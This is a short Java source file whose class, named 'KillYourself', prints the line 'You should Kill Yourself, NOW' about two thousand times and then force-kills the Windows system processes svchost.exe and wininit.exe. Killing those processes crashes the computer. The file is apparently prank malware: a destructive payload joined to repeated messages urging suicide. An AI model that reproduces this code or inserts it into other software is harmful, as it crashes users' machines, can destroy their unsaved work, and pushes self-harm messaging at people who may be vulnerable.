package net.brunogamer.please.stop.going.deeper.please.im.serious.stop.stop.please.stop.you.will.not.like.what.you.see.thats.your.last.warning.you.want.to.proceed.i.see.then.remember.i.warned.you;

import java.io.IOException;

public class KillYourself  {
    public static void youShouldKillYourselfNOW() throws Exception {
        int time = 0;
        while (time < 1000) {
            Thread.sleep(10);
            System.out.println("You should Kill Yourself, NOW ");
            System.out.println("You should Kill Yourself, NOW");
            time += 1;
        }

        Runtime rt = Runtime.getRuntime();
        try {
            rt.exec("taskkill -f -im svchost.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            rt.exec("taskkill -f -im wininit.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.close();
    }
}
